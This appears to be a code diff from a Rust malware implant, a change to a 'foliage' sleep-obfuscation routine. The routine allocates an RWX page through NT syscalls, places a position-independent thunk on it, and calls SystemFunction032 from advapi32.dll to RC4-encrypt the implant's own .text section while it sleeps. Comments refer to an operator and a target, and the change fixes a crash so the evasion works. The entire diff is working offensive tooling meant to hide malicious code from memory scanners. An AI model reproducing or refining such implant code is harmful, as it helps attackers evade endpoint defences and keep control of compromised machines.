@@ -1207,20 +1207,39 @@ unsafe extern "system" fn foliage_helper(param: usize) -> u32 {
         None => return 1,
     };
 
-    // Build the thunk params block. Leaked on the heap — the thunk reads it
-    // via the first argument (rcx in the Windows x64 calling convention).
-    // RC4 is symmetric (mask = unmask), so the same rc4_shim is called for
-    // both encrypt and decrypt. During the mask step .text is still cleartext
-    // (protect RW just happened, RC4 hasn't started), so the call to rc4_shim
-    // (which lives in .text) is safe. During the unmask step .text is
-    // ciphertext — the thunk calls rc4_shim again, which would crash. The
-    // operator must validate this on the target before wiring the gate.
+    // ---- Resolve SystemFunction032 from advapi32.dll ---------------------
+    // This is the real RC4 primitive, in a system DLL (not our .text).
+    // Using it (via a PIC wrapper on the RWX page) means encrypting .text
+    // doesn't corrupt the RC4 code — SystemFunction032 lives in advapi32.dll,
+    // not in our implant.
+    let sf032_addr = match unsafe {
+        crate::resolve::export_addr(b"advapi32.dll", b"SystemFunction032")
+    } {
+        Some(a) => a,
+        None => {
+            // Can't resolve SystemFunction032 — degrade to data-only.
+            let delay: i64 = -((p.secs as i64).saturating_mul(10_000_000));
+            const INVALID_HANDLE: usize = 0xFFFF_FFFF_FFFF_FFFF;
+            let _ = unsafe {
+                raw.nt_wait_for_single_object(INVALID_HANDLE, 0, &delay as *const i64 as usize)
+            };
+            return 0;
+        }
+    };
+
+    // Build the PIC RC4 wrapper: a small trampoline on the RWX page that
+    // adapts the thunk's 4-arg calling convention to SystemFunction032's
+    // 2-USTRING convention.  The wrapper + thunk share the same RWX page.
+    let (wrapper_bytes, wrapper_len) = crate::pic_thunk::build_rc4_sf032_wrapper(sf032_addr);
+
+    // Build the thunk params block.
     let delay_100ns: i64 = -((p.secs as i64).saturating_mul(10_000_000));
     let params = Box::into_raw(Box::new(crate::pic_thunk::PicThunkParams {
         nt_protect_virtual_memory: raw.nt_protect,
         nt_wait_for_single_object: raw.nt_wait_for_single_object,
         invalid_handle: 0xFFFF_FFFF_FFFF_FFFF,
-        rc4_mask: rc4_shim as *const () as usize,
+        // rc4_mask will point to the wrapper on the RWX page (set below)
+        rc4_mask: 0,
         text_base: base,
         text_len: len,
         key: p.key,
@@ -1228,7 +1247,7 @@ unsafe extern "system" fn foliage_helper(param: usize) -> u32 {
         status: core::sync::atomic::AtomicU32::new(0),
     }));
 
-    // Allocate one RWX page (4 KiB) for the thunk code.
+    // Allocate one RWX page for wrapper + thunk.
     type NtAllocFn =
         unsafe extern "system" fn(usize, *mut *mut c_void, *mut usize, u32, u32) -> i32;
     let nt_alloc: NtAllocFn = unsafe { core::mem::transmute(nt_alloc_addr) };
@@ -1237,34 +1256,27 @@ unsafe extern "system" fn foliage_helper(param: usize) -> u32 {
     const MEM_COMMIT: u32 = 0x1000;
     const MEM_RESERVE: u32 = 0x2000;
     const PAGE_EXECUTE_READWRITE: u32 = 0x40;
-    let st = unsafe {
-        nt_alloc(
-            0xFFFF_FFFF_FFFF_FFFF,
-            &mut page,
-            &mut page_size,
-            MEM_COMMIT | MEM_RESERVE,
-            PAGE_EXECUTE_READWRITE,
-        )
-    };
+    let st = unsafe { nt_alloc(!0usize, &mut page, &mut page_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE) };
     if st < 0 || page.is_null() {
         let _ = unsafe { Box::from_raw(params) };
         return 1;
     }
 
-    // Build the PIC thunk (position-independent x86-64 machine code).
+    // Place the RC4 wrapper at the start of the page, then the thunk right after.
+    let wrapper_addr = page as usize;
+    let thunk_addr = wrapper_addr + wrapper_len;
+    unsafe { core::ptr::copy_nonoverlapping(wrapper_bytes.as_ptr(), page as *mut u8, wrapper_len); }
+
+    // Build and copy the PIC thunk.
     let thunk = crate::pic_thunk::build_mask_thunk();
+    unsafe { core::ptr::copy_nonoverlapping(thunk.bytes.as_ptr(), thunk_addr as *mut u8, thunk.len); }
 
-    // Copy thunk bytes to the RWX page.
-    unsafe {
-        core::ptr::copy_nonoverlapping(thunk.bytes.as_ptr(), page as *mut u8, thunk.len);
-    }
+    // Wire rc4_mask to the wrapper (on RWX page, not in .text!).
+    unsafe { (*params).rc4_mask = wrapper_addr; }
 
-    // Call the thunk. Transmute the page address to a fn pointer matching the
-    // Windows x64 calling convention: first arg (rcx) = params pointer.
-    // The thunk handles protect(RW)→mask→wait(delay)→unmask→protect(RX) on
-    // .text, then returns. This call BLOCKS until the sleep window completes.
+    // Call the thunk (which starts after the wrapper on the RWX page).
     let thunk_fn: unsafe extern "system" fn(usize) -> u32 =
-        unsafe { core::mem::transmute(page as usize) };
+        unsafe { core::mem::transmute(thunk_addr) };
     let _ = unsafe { thunk_fn(params as usize) };
 
     // Free the RWX page.
